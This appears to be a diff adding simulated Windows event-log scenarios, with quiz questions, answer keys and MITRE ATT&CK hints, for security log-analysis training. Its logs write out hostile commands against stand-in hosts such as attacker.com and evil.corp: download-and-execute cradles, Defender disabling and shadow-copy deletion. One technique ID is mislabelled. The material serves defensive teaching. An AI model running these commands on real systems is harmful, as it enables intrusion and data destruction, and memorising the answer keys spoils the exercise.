+      "Timestamp: 2024-05-10 14:05:22 | Hostname: CLIENTPC05 | EventID: 3 | Process: powershell.exe | NetworkConnection: DestinationIP=185.22.55.10, DestinationPort=80",
+      "Timestamp: 2024-05-10 14:05:25 | Hostname: CLIENTPC05 | EventID: 11 | Process: powershell.exe | TargetFilename: C:\\Users\\Public\\stage1.ps1",
+      "Timestamp: 2024-05-10 14:05:30 | Hostname: CLIENTPC05 | EventID: 4688 | Process: powershell.exe | CommandLine: powershell.exe -ExecutionPolicy Bypass -File C:\\Users\\Public\\stage1.ps1",
+      "Timestamp: 2024-05-10 14:06:00 | Hostname: CLIENTPC05 | EventID: 4104 | ScriptBlockText: Contains(Set-MpPreference -DisableRealtimeMonitoring $true)",
+      "Timestamp: 2024-05-10 14:06:05 | Hostname: CLIENTPC05 | EventID: 4104 | ScriptBlockText: Contains(vssadmin.exe delete shadows /all /quiet)",
+      "Timestamp: 2024-05-10 14:06:06 | Hostname: CLIENTPC05 | EventID: 4688 | Process: vssadmin.exe | CommandLine: vssadmin.exe delete shadows /all /quiet",
+      "Timestamp: 2024-05-10 14:06:10 | Hostname: CLIENTPC05 | EventID: 4104 | ScriptBlockText: Contains(Stop-Service VSS)",
+      "Timestamp: 2024-05-10 14:07:00 | Hostname: CLIENTPC05 | EventID: 4688 | Process: powershell.exe | CommandLine: powershell -exec bypass C:\\Users\\Public\\stage1.ps1",
+      "Timestamp: 2024-05-10 14:07:05 | Hostname: CLIENTPC05 | EventID: 4688 | Process: net.exe | CommandLine: net use \\\\FILESRV01\\Shared /delete /y",
+      "Timestamp: 2024-05-10 14:07:10 | Hostname: CLIENTPC05 | EventID: 4104 | ScriptBlockText: Contains(Invoke-WebRequest -Uri http://drop.badsite.net/ransom.exe -OutFile C:\\Users\\Public\\ransom.exe)",
+      "Timestamp: 2024-05-10 14:07:15 | Hostname: CLIENTPC05 | EventID: 3 | Process: powershell.exe | NetworkConnection: DestinationIP=185.22.55.10, DestinationPort=80",
+      "Timestamp: 2024-05-10 14:07:20 | Hostname: CLIENTPC05 | EventID: 11 | Process: powershell.exe | TargetFilename: C:\\Users\\Public\\ransom.exe",
+      "Timestamp: 2024-05-10 14:08:00 | Hostname: CLIENTPC05 | EventID: 4688 | Process: ransom.exe | ParentProcess: powershell.exe | CommandLine: C:\\Users\\Public\\ransom.exe",
+      "Timestamp: 2024-05-10 14:08:05 | Hostname: CLIENTPC05 | EventID: 1 | Process: ransom.exe",
+      "Timestamp: 2024-05-10 14:08:10 | Hostname: CLIENTPC05 | EventID: 11 | SourceName: Microsoft-Windows-Sysmon | Process: ransom.exe | TargetFilename: C:\\Users\\finance_user\\Documents\\Financials.xlsx.ENCRYPTED",
+      "Timestamp: 2024-05-10 14:08:10 | Hostname: CLIENTPC05 | EventID: 11 | SourceName: Microsoft-Windows-Sysmon | Process: ransom.exe | TargetFilename: C:\\Users\\finance_user\\Documents\\Proposal.docx.ENCRYPTED",
+      "Timestamp: 2024-05-10 14:08:11 | Hostname: CLIENTPC05 | EventID: 11 | SourceName: Microsoft-Windows-Sysmon | Process: ransom.exe | TargetFilename: C:\\Users\\finance_user\\Desktop\\Meeting_Notes.docx.ENCRYPTED",
+      "Timestamp: 2024-05-10 14:08:11 | Hostname: CLIENTPC05 | EventID: 11 | SourceName: Microsoft-Windows-Sysmon | Process: ransom.exe | TargetFilename: C:\\Users\\finance_user\\Pictures\\logo.jpg.ENCRYPTED",
+      "Timestamp: 2024-05-10 14:08:12 | Hostname: CLIENTPC05 | EventID: 11 | SourceName: Microsoft-Windows-Sysmon | Process: ransom.exe | TargetFilename: C:\\Shared\\Project_Plan.pptx.ENCRYPTED",
+      "Timestamp: 2024-05-10 14:08:15 | Hostname: CLIENTPC05 | EventID: 2 | SourceName: Microsoft-Windows-Sysmon | Process: ransom.exe | TargetFilename: C:\\Users\\finance_user\\Documents\\Financials.xlsx | ChangeTime...",
+      "Timestamp: 2024-05-10 14:08:16 | Hostname: CLIENTPC05 | EventID: 2 | SourceName: Microsoft-Windows-Sysmon | Process: ransom.exe | TargetFilename: C:\\Users\\finance_user\\Documents\\Proposal.docx | ChangeTime...",
+      "Timestamp: 2024-05-10 14:08:20 | Hostname: CLIENTPC05 | EventID: 11 | SourceName: Microsoft-Windows-Sysmon | Process: ransom.exe | TargetFilename: C:\\Users\\finance_user\\Desktop\\RANSOM_NOTE.txt"
+    ],
+    "questions": [
+      {
+        "id": 1,
+        "text": "What was the initial file type used to start the infection chain?",
+        "answer": ".js (JavaScript)",
+        "relevant_log_indices": [],
+        "relevant_mitre_indices": []
+      },
+      {
+        "id": 2,
+        "text": "Which process was used to execute the initial malicious script?",
+        "answer": "wscript.exe",
+        "relevant_log_indices": [],
+        "relevant_mitre_indices": []
+      },
+      {
+        "id": 3,
+        "text": "What PowerShell command was likely used to disable antivirus? (Look for Set-MpPreference)",
+        "answer": "Set-MpPreference -DisableRealtimeMonitoring $true",
+        "relevant_log_indices": [],
+        "relevant_mitre_indices": []
+      },
+      {
+        "id": 4,
+        "text": "What command was executed to hinder system recovery?",
+        "answer": "vssadmin.exe delete shadows /all /quiet",
+        "relevant_log_indices": [],
+        "relevant_mitre_indices": []
+      },
+      {
+        "id": 5,
+        "text": "What is the name of the final payload executable?",
+        "answer": "ransom.exe",
+        "relevant_log_indices": [],
+        "relevant_mitre_indices": []
+      }
+    ],
+    "mitre_hints": [
+      {
+        "tactic": "Initial Access (TA0001)",
+        "technique_name": "Phishing: Spearphishing Attachment",
+        "technique_id": "T1566.001",
+        "url": "https://attack.mitre.org/techniques/T1566/001/"
+      },
+      {
+        "tactic": "Execution (TA0002)",
+        "technique_name": "User Execution: Malicious File",
+        "technique_id": "T1204.002",
+        "url": "https://attack.mitre.org/techniques/T1204/002/"
+      },
+      {
+        "tactic": "Defense Evasion (TA0005)",
+        "technique_name": "Impair Defenses: Disable or Modify Tools",
+        "technique_id": "T1562.001",
+        "url": "https://attack.mitre.org/techniques/T1562/001/"
+      },
+      {
+        "tactic": "Impact (TA0040)",
+        "technique_name": "Inhibit System Recovery",
+        "technique_id": "T1490",
+        "url": "https://attack.mitre.org/techniques/T1490/"
+      },
+      {
+        "tactic": "Impact (TA0040)",
+        "technique_name": "Data Encrypted for Impact",
+        "technique_id": "T1486",
+        "url": "https://attack.mitre.org/techniques/T1486/"
+      }
+    ]
+  },
+  {
+    "name": "Insider Threat - Data Exfiltration via USB",
+    "difficulty": "advanced",
+    "logs": [
+      "Timestamp: 2024-06-01 09:55:00 | Hostname: DEVPC-01 | EventID: 4624 | AccountName: disgruntled_dev | LogonType: 2",
+      "Timestamp: 2024-06-01 10:00:00 | Hostname: DEVPC-01 | EventID: 4688 | Process: powershell.exe | CommandLine: powershell.exe Get-ChildItem -Path \\\\FILESRV01\\SourceCode\\ProjectX -Recurse | Where-Object {!$_.PSIsContainer}",
+      "Timestamp: 2024-06-01 10:06:00 | Hostname: DEVPC-01 | EventID: 5156 | NetworkConnection: Direction=Outbound, DestinationAddress=\\\\FILESRV01\\SourceCode",
+      "Timestamp: 2024-06-01 10:10:00 | Hostname: DEVPC-01 | EventID: 4688 | Process: 7z.exe | CommandLine: C:\\Program Files\\7-Zip\\7z.exe a -tzip C:\\Users\\disgruntled_dev\\Documents\\secret_project.zip \\\\FILESRV01\\SourceCode\\ProjectX\\*",
+      "Timestamp: 2024-06-01 10:11:00 | Hostname: DEVPC-01 | EventID: 11 | TargetFilename: C:\\Users\\disgruntled_dev\\Documents\\secret_project.zip",
+      "Timestamp: 2024-06-01 10:15:00 | Hostname: DEVPC-01 | EventID: 6416 | DeviceName: USBSTOR\\Disk&Ven_Kingston&Prod_DataTraveler_3.0&Rev_PMAP\\ABCDEF123456&0 | DeviceDescription: Kingston DataTraveler 3.0 USB Device",
+      "Timestamp: 2024-06-01 10:15:05 | Hostname: DEVPC-01 | EventID: 4663 | ObjectServer: Security | ObjectType: File | ObjectName: E:\\ | HandleID: 0x1234 | AccessMask: 0x12019f",
+      "Timestamp: 2024-06-01 10:16:00 | Hostname: DEVPC-01 | EventID: 4688 | Process: explorer.exe | CommandLine: explorer.exe",
+      "Timestamp: 2024-06-01 10:16:30 | Hostname: DEVPC-01 | EventID: 4663 | ObjectServer: Security | ObjectType: File | ObjectName: C:\\Users\\disgruntled_dev\\Documents\\secret_project.zip | AccessMask: 0x120089",
+      "Timestamp: 2024-06-01 10:16:31 | Hostname: DEVPC-01 | EventID: 4663 | ObjectServer: Security | ObjectType: File | ObjectName: E:\\secret_project.zip | AccessMask: 0x100116",
+      "Timestamp: 2024-06-01 10:17:00 | Hostname: DEVPC-01 | EventID: 11 | Process: explorer.exe | TargetFilename: E:\\secret_project.zip",
+      "Timestamp: 2024-06-01 10:17:30 | Hostname: DEVPC-01 | EventID: 4663 | ObjectServer: Security | ObjectType: File | ObjectName: C:\\Users\\disgruntled_dev\\Documents\\customer_data.zip | AccessMask: 0x120089",
+      "Timestamp: 2024-06-01 10:17:31 | Hostname: DEVPC-01 | EventID: 4663 | ObjectServer: Security | ObjectType: File | ObjectName: E:\\customer_data.zip | AccessMask: 0x100116",
+      "Timestamp: 2024-06-01 10:18:00 | Hostname: DEVPC-01 | EventID: 11 | Process: explorer.exe | TargetFilename: E:\\customer_data.zip",
+      "Timestamp: 2024-06-01 10:19:00 | Hostname: DEVPC-01 | EventID: 4660 | ObjectServer: Security | ObjectName: C:\\Users\\disgruntled_dev\\Documents\\secret_project.zip | ProcessName: explorer.exe",
+      "Timestamp: 2024-06-01 10:19:05 | Hostname: DEVPC-01 | EventID: 4660 | ObjectServer: Security | ObjectName: C:\\Users\\disgruntled_dev\\Documents\\customer_data.zip | ProcessName: explorer.exe",
+      "Timestamp: 2024-06-01 10:20:00 | Hostname: DEVPC-01 | EventID: 4634 | AccountName: disgruntled_dev | LogonType: 2"
+    ],
+    "questions": [
+      {
+        "id": 1,
+        "text": "Which user account is associated with this activity?",
+        "answer": "disgruntled_dev",
+        "relevant_log_indices": [],
+        "relevant_mitre_indices": []
+      },
+      {
+        "id": 2,
+        "text": "What directory was the user accessing on the file server?",
+        "answer": "\\\\FILESRV01\\SourceCode\\ProjectX",
+        "relevant_log_indices": [],
+        "relevant_mitre_indices": []
+      },
+      {
+        "id": 3,
+        "text": "What tool was used to archive the data before potential exfiltration?",
+        "answer": "7z.exe",
+        "relevant_log_indices": [],
+        "relevant_mitre_indices": []
+      },
+      {
+        "id": 4,
+        "text": "What type of device was connected that likely facilitated the exfiltration (Event ID 6416)?",
+        "answer": "USB Storage Device",
+        "relevant_log_indices": [],
+        "relevant_mitre_indices": []
+      },
+      {
+        "id": 5,
+        "text": "What Sysmon event ID indicates file creation, confirming the copy to the external drive?",
+        "answer": "11",
+        "relevant_log_indices": [],
+        "relevant_mitre_indices": []
+      }
+    ],
+    "mitre_hints": [
+      {
+        "tactic": "Collection (TA0009)",
+        "technique_name": "Data from Network Shared Drive",
+        "technique_id": "T1039",
+        "url": "https://attack.mitre.org/techniques/T1039/"
+      },
+      {
+        "tactic": "Collection (TA0009)",
+        "technique_name": "Archive Collected Data: Archive via Utility",
+        "technique_id": "T1560.001",
+        "url": "https://attack.mitre.org/techniques/T1560/001/"
+      },
+      {
+        "tactic": "Exfiltration (TA0010)",
+        "technique_name": "Exfiltration Over Physical Medium: Exfiltration over USB",
+        "technique_id": "T1052.001",
+        "url": "https://attack.mitre.org/techniques/T1052/001/"
+      }
+    ]
+  },
+  {
+    "name": "Living Off The Land (LOTL) Attack",
+    "difficulty": "advanced",
+    "logs": [
+      "Timestamp: 2024-06-15 10:55:00 | Hostname: MKTG-PC | EventID: 4688 | Process: outlook.exe",
+      "Timestamp: 2024-06-15 11:00:10 | Hostname: MKTG-PC | EventID: 4688 | Process: WINWORD.EXE",
+      "Timestamp: 2024-06-15 11:01:05 | Hostname: MKTG-PC | EventID: 4688 | Process: mshta.exe | ParentProcess: WINWORD.EXE | CommandLine: mshta.exe \"http://attacker.com/payload.hta\"",
+      "Timestamp: 2024-06-15 11:01:06 | Hostname: MKTG-PC | EventID: 22 | Process: mshta.exe | QueryName: attacker.com",
+      "Timestamp: 2024-06-15 11:01:07 | Hostname: MKTG-PC | EventID: 3 | Process: mshta.exe | NetworkConnection: DestinationIP=172.16.80.130, DestinationPort=80",
+      "Timestamp: 2024-06-15 11:01:10 | Hostname: MKTG-PC | EventID: 4688 | Process: powershell.exe | ParentProcess: mshta.exe | CommandLine: powershell -exec bypass -nop -w hidden -c \"Write-Host ('Stage 1'); Start-Sleep 2; ... \"",
+      "Timestamp: 2024-06-15 11:01:15 | Hostname: MKTG-PC | EventID: 4688 | Process: powershell.exe | ParentProcess: mshta.exe | CommandLine: powershell.exe -nop -w hidden -c \"Start-BitsTransfer -Source http://attacker.com/beacon.dll -Destination C:\\Users\\marketing_user\\AppData\\Local\\Temp\\beacon.dll\"",
+      "Timestamp: 2024-06-15 11:01:18 | Hostname: MKTG-PC | EventID: 3 | Process: powershell.exe | NetworkConnection: DestinationIP=172.16.80.130, DestinationPort=80",
+      "Timestamp: 2024-06-15 11:01:19 | Hostname: MKTG-PC | EventID: 11 | Process: powershell.exe | TargetFilename: C:\\Users\\marketing_user\\AppData\\Local\\Temp\\beacon.dll",
+      "Timestamp: 2024-06-15 11:02:00 | Hostname: MKTG-PC | EventID: 4688 | Process: regsvr32.exe | ParentProcess: powershell.exe | CommandLine: regsvr32.exe /s /u /i:http://attacker.com/scrobject.sct scrobj.dll",
+      "Timestamp: 2024-06-15 11:02:02 | Hostname: MKTG-PC | EventID: 3 | Process: regsvr32.exe | NetworkConnection: DestinationIP=172.16.80.130, DestinationPort=80",
+      "Timestamp: 2024-06-15 11:02:05 | Hostname: MKTG-PC | EventID: 4688 | Process: rundll32.exe | CommandLine: rundll32.exe C:\\Users\\marketing_user\\AppData\\Local\\Temp\\beacon.dll,StartW",
+      "Timestamp: 2024-06-15 11:02:06 | Hostname: MKTG-PC | EventID: 7 | Process: rundll32.exe | ImageLoaded: C:\\Users\\marketing_user\\AppData\\Local\\Temp\\beacon.dll",
+      "Timestamp: 2024-06-15 11:02:10 | Hostname: MKTG-PC | EventID: 3 | Process: rundll32.exe | NetworkConnection: DestinationIP=172.16.80.130, DestinationPort=443",
+      "Timestamp: 2024-06-15 11:03:00 | Hostname: MKTG-PC | EventID: 4688 | Process: cmd.exe | ParentProcess: rundll32.exe | CommandLine: cmd /c dir C:\\Users\\marketing_user\\Documents",
+      "Timestamp: 2024-06-15 11:03:05 | Hostname: MKTG-PC | EventID: 4688 | Process: cmd.exe | ParentProcess: rundll32.exe | CommandLine: cmd /c systeminfo",
+      "Timestamp: 2024-06-15 11:04:00 | Hostname: MKTG-PC | EventID: 4688 | Process: powershell.exe | ParentProcess: rundll32.exe | CommandLine: powershell Get-Clipboard",
+      "Timestamp: 2024-06-15 11:05:00 | Hostname: MKTG-PC | EventID: 4688 | Process: certutil.exe | CommandLine: certutil.exe -urlcache -split -f http://attacker.com/sensitive_docs.zip C:\\Users\\marketing_user\\AppData\\Local\\Temp\\stolen.zip",
+      "Timestamp: 2024-06-15 11:05:02 | Hostname: MKTG-PC | EventID: 3 | Process: certutil.exe | NetworkConnection: DestinationIP=172.16.80.130, DestinationPort=80",
+      "Timestamp: 2024-06-15 11:05:03 | Hostname: MKTG-PC | EventID: 11 | Process: certutil.exe | TargetFilename: C:\\Users\\marketing_user\\AppData\\Local\\Temp\\stolen.zip",
+      "Timestamp: 2024-06-15 11:06:00 | Hostname: MKTG-PC | EventID: 3 | Process: rundll32.exe | NetworkConnection: DestinationIP=172.16.80.130, DestinationPort=443"
+    ],
+    "questions": [
+      {
+        "id": 1,
+        "text": "Which legitimate Windows process was used to download and execute the initial HTA file?",
+        "answer": "mshta.exe",
+        "relevant_log_indices": [],
+        "relevant_mitre_indices": []
+      },
+      {
+        "id": 2,
+        "text": "Which native Windows tool was used to download the beacon.dll file?",
+        "answer": "bitsadmin (via Start-BitsTransfer in PowerShell)",
+        "relevant_log_indices": [],
+        "relevant_mitre_indices": []
+      },
+      {
+        "id": 3,
+        "text": "Which process was used to execute code via a remote SCT file (Squiblydoo)?",
+        "answer": "regsvr32.exe",
+        "relevant_log_indices": [],
+        "relevant_mitre_indices": []
+      },
+      {
+        "id": 4,
+        "text": "Which process is executing the final beacon.dll payload?",
+        "answer": "rundll32.exe",
+        "relevant_log_indices": [],
+        "relevant_mitre_indices": []
+      },
+      {
+        "id": 5,
+        "text": "Which legitimate Windows utility was potentially misused for data exfiltration near the end?",
+        "answer": "certutil.exe",
+        "relevant_log_indices": [],
+        "relevant_mitre_indices": []
+      }
+    ],
+    "mitre_hints": [
+      {
+        "tactic": "Execution (TA0002)",
+        "technique_name": "Signed Binary Proxy Execution: Mshta",
+        "technique_id": "T1218.005",
+        "url": "https://attack.mitre.org/techniques/T1218/005/"
+      },
+      {
+        "tactic": "Command and Control (TA0011)",
+        "technique_name": "Ingress Tool Transfer",
+        "technique_id": "T1105",
+        "url": "https://attack.mitre.org/techniques/T1105/"
+      },
+      {
+        "tactic": "Defense Evasion (TA0005)",
+        "technique_name": "Signed Binary Proxy Execution: Regsvr32",
+        "technique_id": "T1218.010",
+        "url": "https://attack.mitre.org/techniques/T1218/010/"
+      },
+      {
+        "tactic": "Execution (TA0002)",
+        "technique_name": "Signed Binary Proxy Execution: Rundll32",
+        "technique_id": "T1218.011",
+        "url": "https://attack.mitre.org/techniques/T1218/011/"
+      },
+      {
+        "tactic": "Exfiltration (TA0010)",
+        "technique_name": "Exfiltration Over C2 Channel",
+        "technique_id": "T1041",
+        "url": "https://attack.mitre.org/techniques/T1041/"
+      }
+    ]
+  },
+  {
+    "name": "DLL Hijacking Persistence",
+    "difficulty": "advanced",
+    "logs": [
+      "Timestamp: 2024-07-01 09:55:00 | Hostname: FIN-PC01 | EventID: 4688 | Process: teams.exe",
+      "Timestamp: 2024-07-01 10:00:00 | Hostname: FIN-PC01 | EventID: 4688 | Process: explorer.exe",
+      "Timestamp: 2024-07-01 10:01:00 | Hostname: FIN-PC01 | EventID: 4688 | Process: chrome.exe | CommandLine: C:\\...\\chrome.exe",
+      "Timestamp: 2024-07-01 10:01:30 | Hostname: FIN-PC01 | EventID: 4656 | ObjectName: \\REGISTRY\\MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion | ObjectType: Key | Accesses: QueryKey",
+      "Timestamp: 2024-07-01 10:02:00 | Hostname: FIN-PC01 | EventID: 4688 | Process: powershell.exe | CommandLine: powershell -c \\\"(New-Object Net.WebClient).DownloadFile('http://malicious.site/payload.dll','C:\\\\Users\\\\victim\\\\AppData\\\\Local\\\\Temp\\\\malicious.dll')\\\"",
+      "Timestamp: 2024-07-01 10:02:01 | Hostname: FIN-PC01 | EventID: 4104 | SourceName: Microsoft-Windows-PowerShell | ScriptBlockText: Contains((New-Object Net.WebClient).DownloadFile)",
+      "Timestamp: 2024-07-01 10:02:05 | Hostname: FIN-PC01 | EventID: 3 | Process: powershell.exe | DestinationIP=111.22.33.44, DestinationPort=80",
+      "Timestamp: 2024-07-01 10:02:10 | Hostname: FIN-PC01 | EventID: 11 | Process: powershell.exe | TargetFilename: C:\\Users\\victim\\AppData\\Local\\Temp\\malicious.dll",
+      "Timestamp: 2024-07-01 10:05:00 | Hostname: FIN-PC01 | EventID: 4688 | Process: cmd.exe | CommandLine: cmd /c dir \\\"C:\\\\Program Files\\\\LegitApp\\\\\\\"",
+      "Timestamp: 2024-07-01 10:05:05 | Hostname: FIN-PC01 | EventID: 4688 | Process: svchost.exe | CommandLine: C:\\Windows\\system32\\svchost.exe -k NetworkService -p -s Dnscache",
+      "Timestamp: 2024-07-01 10:05:10 | Hostname: FIN-PC01 | EventID: 4688 | Process: cmd.exe | CommandLine: cmd /c copy C:\\Users\\victim\\AppData\\Local\\Temp\\malicious.dll \\\"C:\\\\Program Files\\\\LegitApp\\\\version.dll\\\"",
+      "Timestamp: 2024-07-01 10:05:12 | Hostname: FIN-PC01 | EventID: 11 | Process: cmd.exe | TargetFilename: C:\\Program Files\\LegitApp\\version.dll",
+      "Timestamp: 2024-07-01 10:10:00 | Hostname: FIN-PC01 | EventID: 4657 | ObjectName: C:\\Program Files\\LegitApp\\version.dll | ObjectType: File | Accesses: WriteData/AppendData",
+      "Timestamp: 2024-07-01 10:12:00 | Hostname: FIN-PC01 | EventID: 4624 | AccountName: victim | LogonType: 2",
+      "Timestamp: 2024-07-01 10:15:00 | Hostname: FIN-PC01 | EventID: 4688 | Process: cmd.exe | CommandLine: cmd /c del C:\\Users\\victim\\AppData\\Local\\Temp\\malicious.dll",
+      "Timestamp: 2024-07-01 10:30:00 | Hostname: FIN-PC01 | EventID: 4634 | AccountName: victim | LogonType: 2", 
+      "Timestamp: 2024-07-01 11:00:00 | Hostname: FIN-PC01 | EventID: 4688 | Process: LegitApp.exe | CommandLine: C:\\Program Files\\LegitApp\\LegitApp.exe",
+      "Timestamp: 2024-07-01 11:00:01 | Hostname: FIN-PC01 | EventID: 7 | SourceName: Microsoft-Windows-Sysmon | ProcessId: 5123 | Image: C:\\Program Files\\LegitApp\\LegitApp.exe | ImageLoaded: C:\\Program Files\\LegitApp\\version.dll",
+      "Timestamp: 2024-07-01 11:00:02 | Hostname: FIN-PC01 | EventID: 4688 | Process: rundll32.exe | ParentProcess: LegitApp.exe | CommandLine: rundll32.exe \\\"C:\\\\Program Files\\\\LegitApp\\\\version.dll\\\",MaliciousEntryPoint",
+      "Timestamp: 2024-07-01 11:00:05 | Hostname: FIN-PC01 | EventID: 3 | Process: LegitApp.exe | NetworkConnection: DestinationIP=10.40.50.60, DestinationPort=8443, Protocol=TCP",
+      "Timestamp: 2024-07-01 11:00:06 | Hostname: FIN-PC01 | EventID: 3 | Process: rundll32.exe | NetworkConnection: DestinationIP=10.40.50.60, DestinationPort=8443, Protocol=TCP",
+      "Timestamp: 2024-07-01 11:00:10 | Hostname: FIN-PC01 | EventID: 4688 | Process: cmd.exe | ParentProcess: rundll32.exe | CommandLine: cmd.exe /c net user",
+      "Timestamp: 2024-07-01 11:00:11 | Hostname: FIN-PC01 | EventID: 4688 | Process: net.exe | ParentProcess: cmd.exe | CommandLine: net user",
+      "Timestamp: 2024-07-01 11:00:15 | Hostname: FIN-PC01 | EventID: 4688 | Process: cmd.exe | ParentProcess: rundll32.exe | CommandLine: cmd.exe /c ipconfig /all",
+      "Timestamp: 2024-07-01 11:00:16 | Hostname: FIN-PC01 | EventID: 4688 | Process: ipconfig.exe | ParentProcess: cmd.exe | CommandLine: ipconfig /all" 
+    ],
+    "questions": [
+      {
+        "id": 1,
+        "text": "What file was replaced or overwritten by the attacker?",
+        "answer": "C:\\Program Files\\LegitApp\\version.dll",
+        "relevant_log_indices": [10, 11, 12],
+        "relevant_mitre_indices": [0, 1]
+      },
+      {
+        "id": 2,
+        "text": "What legitimate application likely loaded the malicious DLL?",
+        "answer": "LegitApp.exe",
+        "relevant_log_indices": [16, 17],
+        "relevant_mitre_indices": [0, 1]
+      },
+      {
+        "id": 3,
+        "text": "What Sysmon Event ID shows DLL loading events?",
+        "answer": "7",
+        "relevant_log_indices": [],
+        "relevant_mitre_indices": []
+      }
+    ],
+    "mitre_hints": [
+      {
+        "tactic": "Persistence (TA0003)",
+        "technique_name": "Hijack Execution Flow: DLL Search Order Hijacking",
+        "technique_id": "T1574.001",
+        "url": "https://attack.mitre.org/techniques/T1574/001/"
+      },
+      {
+        "tactic": "Defense Evasion (TA0005)",
+        "technique_name": "Hijack Execution Flow: DLL Search Order Hijacking",
+        "technique_id": "T1574.001",
+        "url": "https://attack.mitre.org/techniques/T1574/001/"
+      }
+    ]
+  },
+  {
+    "name": "ICMP Command and Control",
+    "difficulty": "advanced",
+    "logs": [
+      "Timestamp: 2024-07-05 13:50:00 | Hostname: SRV-DATA | EventID: 4688 | Process: powershell.exe | CommandLine: powershell -enc ... (base64 encoded script that drops beacon.exe)",
+      "Timestamp: 2024-07-05 13:50:05 | Hostname: SRV-DATA | EventID: 11 | Process: powershell.exe | TargetFilename: C:\\PerfLogs\\beacon.exe",
+      "Timestamp: 2024-07-05 14:00:00 | Hostname: SRV-DATA | EventID: 4688 | Process: beacon.exe | CommandLine: C:\\PerfLogs\\beacon.exe -mode icmp -target 1.2.3.4",
+      "Timestamp: 2024-07-05 14:00:01 | Hostname: SRV-DATA | EventID: 1 | Process: beacon.exe",
+      "Timestamp: 2024-07-05 14:00:05 | Hostname: SRV-DATA | EventID: 5156 | NetworkConnection: Direction=Outbound, Protocol=ICMP, DestinationAddress=1.2.3.4, Type=8, Code=0, Application=C:\\PerfLogs\\beacon.exe",
+      "Timestamp: 2024-07-05 14:00:06 | Hostname: SRV-DATA | EventID: 5156 | NetworkConnection: Direction=Inbound, Protocol=ICMP, SourceAddress=1.2.3.4, Type=0, Code=0, Application=System",
+      "Timestamp: 2024-07-05 14:01:10 | Hostname: SRV-DATA | EventID: 5156 | NetworkConnection: Direction=Outbound, Protocol=ICMP, DestinationAddress=1.2.3.4, Type=8, Code=0, Application=C:\\PerfLogs\\beacon.exe, Size=64",
+      "Timestamp: 2024-07-05 14:01:11 | Hostname: SRV-DATA | EventID: 5156 | NetworkConnection: Direction=Inbound, Protocol=ICMP, SourceAddress=1.2.3.4, Type=0, Code=0, Application=System, Size=128",
+      "Timestamp: 2024-07-05 14:01:15 | Hostname: SRV-DATA | EventID: 4688 | Process: cmd.exe | ParentProcess: beacon.exe | CommandLine: cmd /c whoami",
+      "Timestamp: 2024-07-05 14:01:20 | Hostname: SRV-DATA | EventID: 5156 | NetworkConnection: Direction=Outbound, Protocol=ICMP, DestinationAddress=1.2.3.4, Type=8, Code=0, Application=C:\\PerfLogs\\beacon.exe, Size=100",
+      "Timestamp: 2024-07-05 14:01:21 | Hostname: SRV-DATA | EventID: 5156 | NetworkConnection: Direction=Inbound, Protocol=ICMP, SourceAddress=1.2.3.4, Type=0, Code=0, Application=System, Size=64",
+      "Timestamp: 2024-07-05 14:02:15 | Hostname: SRV-DATA | EventID: 5156 | NetworkConnection: Direction=Outbound, Protocol=ICMP, DestinationAddress=1.2.3.4, Type=8, Code=0, Application=C:\\PerfLogs\\beacon.exe, Size=64",
+      "Timestamp: 2024-07-05 14:02:16 | Hostname: SRV-DATA | EventID: 5156 | NetworkConnection: Direction=Inbound, Protocol=ICMP, SourceAddress=1.2.3.4, Type=0, Code=0, Application=System, Size=256"
+    ],
+    "questions": [
+      {
+        "id": 1,
+        "text": "What network protocol is primarily used for communication by beacon.exe?",
+        "answer": "ICMP",
+        "relevant_log_indices": [],
+        "relevant_mitre_indices": []
+      },
+      {
+        "id": 2,
+        "text": "What is the likely C2 server IP address?",
+        "answer": "1.2.3.4",
+        "relevant_log_indices": [],
+        "relevant_mitre_indices": []
+      },
+      {
+        "id": 3,
+        "text": "What Event ID logs network connections (including ICMP if enabled)?",
+        "answer": "5156",
+        "relevant_log_indices": [],
+        "relevant_mitre_indices": []
+      },
+      {
+        "id": 4,
+        "text": "What difference in ICMP packet sizes between outbound (Type 8) and inbound (Type 0) might suggest data transfer?",
+        "answer": "Inbound larger than outbound",
+        "relevant_log_indices": [],
+        "relevant_mitre_indices": []
+      }
+    ],
+    "mitre_hints": [
+      {
+        "tactic": "Command and Control (TA0011)",
+        "technique_name": "Application Layer Protocol: ICMP",
+        "technique_id": "T1071.001",
+        "url": "https://attack.mitre.org/techniques/T1071/001/"
+      },
+      {
+        "tactic": "Command and Control (TA0011)",
+        "technique_name": "Protocol Tunneling",
+        "technique_id": "T1572",
+        "url": "https://attack.mitre.org/techniques/T1572/"
+      }
+    ]
+  },
+  {
+    "name": "Office Macro Executes LOTL",
+    "difficulty": "advanced",
+    "logs": [
+      "Timestamp: 2024-07-10 09:25:00 | Hostname: SALES-PC | EventID: 4688 | Process: chrome.exe",
+      "Timestamp: 2024-07-10 09:30:00 | Hostname: SALES-PC | EventID: 4688 | Process: WINWORD.EXE | CommandLine: \"C:\\Program Files\\...\\WINWORD.EXE\" /n \"C:\\Users\\SalesUser\\Documents\\Quarterly_Report.docm\"",
+      "Timestamp: 2024-07-10 09:30:01 | Hostname: SALES-PC | EventID: 4103 | SourceName: Microsoft-Windows-PowerShell | Context: Host Application = C:\\Program Files\\...\\WINWORD.EXE",
+      "Timestamp: 2024-07-10 09:30:02 | Hostname: SALES-PC | EventID: 11 | Process: WINWORD.EXE | TargetFilename: C:\\Users\\SalesUser\\AppData\\Local\\Temp\\payload.csproj",
+      "Timestamp: 2024-07-10 09:30:05 | Hostname: SALES-PC | EventID: 4688 | Process: msbuild.exe | ParentProcess: WINWORD.EXE | CommandLine: C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\msbuild.exe C:\\Users\\SalesUser\\AppData\\Local\\Temp\\payload.csproj",
+      "Timestamp: 2024-07-10 09:30:10 | Hostname: SALES-PC | EventID: 4688 | Process: csc.exe | ParentProcess: msbuild.exe",
+      "Timestamp: 2024-07-10 09:30:10 | Hostname: SALES-PC | EventID: 4688 | Process: cvtres.exe | ParentProcess: msbuild.exe",
+      "Timestamp: 2024-07-10 09:30:15 | Hostname: SALES-PC | EventID: 4688 | Process: cmd.exe | ParentProcess: cvtres.exe | CommandLine: cmd /c powershell IEX(New-Object Net.Webclient).downloadString('http://evil.corp/psh')",
+      "Timestamp: 2024-07-10 09:30:16 | Hostname: SALES-PC | EventID: 22 | Process: powershell.exe | QueryName: evil.corp",
+      "Timestamp: 2024-07-10 09:30:17 | Hostname: SALES-PC | EventID: 3 | Process: powershell.exe | NetworkConnection: DestinationIP=91.82.73.64, DestinationPort=80",
